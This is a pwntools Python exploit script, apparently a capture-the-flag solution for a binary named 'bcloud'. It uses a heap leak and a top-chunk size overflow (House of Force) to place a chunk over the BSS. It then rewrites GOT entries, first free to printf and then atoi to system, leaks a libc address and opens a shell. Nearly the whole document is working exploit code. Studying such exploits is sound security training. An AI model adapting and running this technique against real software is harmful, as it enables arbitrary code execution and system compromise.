#!/usr/bin/env python
from pwn import *
import sys, struct, time

context.log_level = 'debug'

r = process(['./bcloud'])

gdb.attach(r)

# Send name and leak the heap buffer
r.send("A" * 0x3c + "ZZZZ")
garbage = r.recvuntil("ZZZZ")
leak = u32(r.recv(4))  #first chunk
garbage = r.recv()
log.info("Leak: " + hex(leak))


# Send Host and Org to overflow the wilderness

HOST = "B" * 0x40
wilderness = "\xff\xff\xff\xff"
r.send(HOST)
r.sendline(wilderness)
garbage = r.recv()

# Plan - step 1: Request a chunk to reach the BSS
r.sendline('1')
bss = 0x804b0a0

size = (0xffffffff - leak - 224) + bss - 4
log.info("Size: " + hex(size))
size = (0xffffffff ^ size) + 1
r.sendline("-" + str(size))

# Plan - step 2: Allocate another chunk on top of BSS
atoi = 0x804b03c
free = 0x804b014
r.sendline('1')
r.sendline('172')

# Plan - step 3: Fill out the lengths[] and notes[] arrays
# with pre-defined values of sizes and GOT addresses
payload = p32(4)
payload += p32(4)
payload += p32(4)
payload += p32(0) * 29
payload += p32(atoi)
payload += p32(free)
payload += p32(atoi)
payload += p32(0) * 8

r.send(payload)
garbage = r.recv()

# Plan - step 4: Change free to printf
printf = 0x80484d0	#plt
r.sendline('3')
r.sendline('1')
r.send(p32(printf))
garbage = r.recv()

# Plan - step 5: Leak atoi@got
r.sendline('4')
r.sendline('0')

garbage = r.recvuntil("Input the id:\n")
garbage = r.recvuntil("Input the id:\n", timeout=1)

atoi = u32(r.recv(4))
log.info("Atoi: " + hex(atoi))
garbage = r.recv()

# Plan - step 6: Change atoi to system
system = atoi + 0xe930
r.sendline('3')
r.sendline('2')
r.send(p32(system))
garbage = r.recv()

# Use the menu to call system
r.sendline("/bin/sh\x00")

r.interactive()
